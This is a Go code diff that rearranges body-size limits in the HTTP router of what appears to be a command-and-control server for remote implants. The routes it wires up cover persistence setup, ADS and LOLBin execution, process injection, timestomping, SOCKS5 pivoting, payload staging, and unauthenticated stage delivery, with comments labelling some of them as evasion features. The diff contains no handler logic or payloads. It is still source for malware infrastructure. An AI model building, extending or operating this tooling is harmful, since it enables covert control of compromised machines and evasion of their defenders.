@@ -27,24 +27,26 @@ func NewRouter(server *core.Server) *Router {
 func (r *Router) Setup() *gin.Engine {
 	router := gin.New()
 
-	// Global middleware - ORDER MATTERS!
-	router.Use(gin.Recovery())                                  // Gin's built-in recovery
-	router.Use(r.middleware.ErrorRecovery())                    // Our enhanced recovery
-	router.Use(r.middleware.SecurityHeaders())                  // Security headers first
-	router.Use(r.middleware.CORS())                             // CORS handling
-	router.Use(r.middleware.RequestSizeLimit(10 * 1024 * 1024)) // 10MB limit for most requests
-	router.Use(r.middleware.ValidateContentType())              // Content-Type validation
-	router.Use(r.middleware.Logging())                          // Request logging
-	router.Use(r.middleware.RateLimit())                        // Rate limiting
-	router.Use(r.middleware.Auth())                             // Authentication (last before routes)
+	// Global middleware (no body-size limit here — applied per group below)
+	router.Use(gin.Recovery())
+	router.Use(r.middleware.ErrorRecovery())
+	router.Use(r.middleware.SecurityHeaders())
+	router.Use(r.middleware.CORS())
+	router.Use(r.middleware.ValidateContentType())
+	router.Use(r.middleware.Logging())
+	router.Use(r.middleware.RateLimit())
+	router.Use(r.middleware.Auth())
 
 	// Static files
 	router.Static("/static", "./web/static")
 	router.LoadHTMLGlob("web/templates/*")
 	router.GET("/", r.handlers.Dashboard)
 
-	// API v1 routes
+	// ── Routes with 10 MB body limit ─────────────────────────────────────────
+	// All standard API routes. The limit is applied at the group level so it
+	// is installed once (before the route handler) and wraps the raw body.
 	v1 := router.Group("/api/v1")
+	v1.Use(r.middleware.RequestSizeLimit(10 * 1024 * 1024))
 	{
 		// Agent management
 		v1.GET("/agents", r.handlers.ListAgents)
@@ -62,38 +64,23 @@ func (r *Router) Setup() *gin.Engine {
 		v1.GET("/agent/:id/commands", r.handlers.GetAgentCommands)
 		v1.DELETE("/agent/:id/queue", r.handlers.ClearAgentQueue)
 
-		// File operations (with higher size limits)
-		fileGroup := v1.Group("/agent/:id")
-		{
-			// Remove size limit for file uploads specifically
-			fileGroup.POST("/upload", func(c *gin.Context) {
-				// Remove the general size limit for this endpoint
-				c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024) // 100MB for uploads
-				r.handlers.UploadToAgent(c)
-			})
-			fileGroup.POST("/download", r.handlers.DownloadFromAgent)
-		}
+		// File download (agent → operator)
+		v1.POST("/agent/:id/download", r.handlers.DownloadFromAgent)
 
 		// Process management
-		process := v1.Group("/agent/:id/process")
-		{
-			process.POST("/list", r.handlers.ListProcesses)
-			process.POST("/kill", r.handlers.KillProcess)
-			process.POST("/start", r.handlers.StartProcess)
-		}
+		v1.POST("/agent/:id/process/list", r.handlers.ListProcesses)
+		v1.POST("/agent/:id/process/kill", r.handlers.KillProcess)
+		v1.POST("/agent/:id/process/start", r.handlers.StartProcess)
 
 		// Persistence
-		persist := v1.Group("agent/:id/persistence/")
-		{
-			persist.POST("/setup", r.handlers.SetupPersistence)
-			persist.POST("/remove", r.handlers.RemovePersistence)
-		}
+		v1.POST("/agent/:id/persistence/setup", r.handlers.SetupPersistence)
+		v1.POST("/agent/:id/persistence/remove", r.handlers.RemovePersistence)
 
-		// ADS & LOLBin (Level 1 evasion)
+		// ADS & LOLBin
 		v1.POST("/agent/:id/ads/exec", r.handlers.ADSExec)
 		v1.POST("/agent/:id/fetch", r.handlers.LOLBinFetch)
 
-		// Level 2 evasion
+		// Phase 2 — injection / timestomp
 		v1.POST("/agent/:id/inject/remote", r.handlers.InjectRemote)
 		v1.POST("/agent/:id/inject/self", r.handlers.InjectSelf)
 		v1.POST("/agent/:id/timestomp", r.handlers.Timestomp)
@@ -158,11 +145,7 @@ func (r *Router) Setup() *gin.Engine {
 		v1.POST("/agent/:id/pivot/socks5/stop", r.handlers.SOCKS5Stop)
 		v1.POST("/agent/:id/pivot/socks5/status", r.handlers.SOCKS5Status)
 
-		// Stage management (operator) — base64 payload can reach ~67 MB for 50 MB binary
-		v1.POST("/stage", func(c *gin.Context) {
-			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
-			r.handlers.CreateStage(c)
-		})
+		// Stage management (list + delete are tiny)
 		v1.GET("/stages", r.handlers.ListStages)
 		v1.DELETE("/stage/:token", r.handlers.DeleteStage)
 
@@ -171,6 +154,24 @@ func (r *Router) Setup() *gin.Engine {
 		v1.GET("/health", r.handlers.HealthCheck)
 		v1.GET("/logs", r.handlers.GetLogs)
 		v1.GET("/queue/stats", r.handlers.GetQueueStats)
+	}
+
+	// ── Routes that manage their own (large) body limits ─────────────────────
+	// These are on a separate group so the 10 MB group middleware above does
+	// not wrap their bodies before their own MaxBytesReader runs.
+	upload := router.Group("/api/v1")
+	{
+		// Operator → agent file push (up to 100 MB)
+		upload.POST("/agent/:id/upload", func(c *gin.Context) {
+			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
+			r.handlers.UploadToAgent(c)
+		})
+
+		// Stage payload upload — base64 JSON, up to ~67 MB for a 50 MB binary
+		upload.POST("/stage", func(c *gin.Context) {
+			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
+			r.handlers.CreateStage(c)
+		})
 	}
 
 	// Public stage delivery endpoint — no auth, token is the credential
